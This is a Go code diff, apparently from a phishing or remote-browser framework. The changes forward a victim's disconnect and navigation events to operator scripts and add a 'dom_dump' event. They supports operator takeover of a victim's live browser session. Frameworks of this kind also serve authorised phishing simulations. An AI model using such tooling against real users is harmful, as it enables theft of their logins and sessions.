@@ -586,6 +586,10 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 			_, msg, err := conn.ReadMessage()
 			if err != nil {
 				sess.victimConnected.Store(false)
+				select {
+				case runner.Incoming <- remotebrowser.IncomingMsg{Event: "disconnect"}:
+				default:
+				}
 				// keepAlive: browser is parked for operator takeover — a victim
 				// disconnect must not kill the session, the operator still needs it.
 				if !sess.isKeepAlive.Load() {
@@ -671,14 +675,34 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 
 	go runner.Run(ctx) //nolint:errcheck
 
-	// As soon as the browser spawns, mark the session as streamable and apply
-	// the victim viewport if it was already received before the browser was ready.
+	// As soon as the browser spawns, mark the session as streamable, apply the
+	// victim viewport, and subscribe to navigation events so the script can react
+	// via s.on("navigate", fn).
 	go func() {
 		select {
 		case <-ctx.Done():
 		case page := <-runner.BrowserCh:
 			sess.setBrowserPage(page)
 			applyViewport(page)
+			wait := page.EachEvent(
+				func(e *proto.PageFrameNavigated) (stop bool) {
+					if e.Frame != nil && e.Frame.ParentID == "" {
+						select {
+						case runner.Incoming <- remotebrowser.IncomingMsg{Event: "navigate", Data: map[string]string{"url": e.Frame.URL}}:
+						default:
+						}
+					}
+					return
+				},
+				func(e *proto.PageNavigatedWithinDocument) (stop bool) {
+					select {
+					case runner.Incoming <- remotebrowser.IncomingMsg{Event: "navigate", Data: map[string]string{"url": e.URL}}:
+					default:
+					}
+					return
+				},
+			)
+			go wait()
 		}
 	}()
 
@@ -767,7 +791,7 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 			processEvent(evt)
 			if evt.Type == "log" || evt.Type == "capture" || evt.Type == "submit" ||
 				evt.Type == "keep_alive" || evt.Type == "info" || evt.Type == "error" ||
-				evt.Type == "screenshot" {
+				evt.Type == "screenshot" || evt.Type == "dom_dump" {
 				continue
 			}
 			payload, err := json.Marshal(map[string]interface{}{
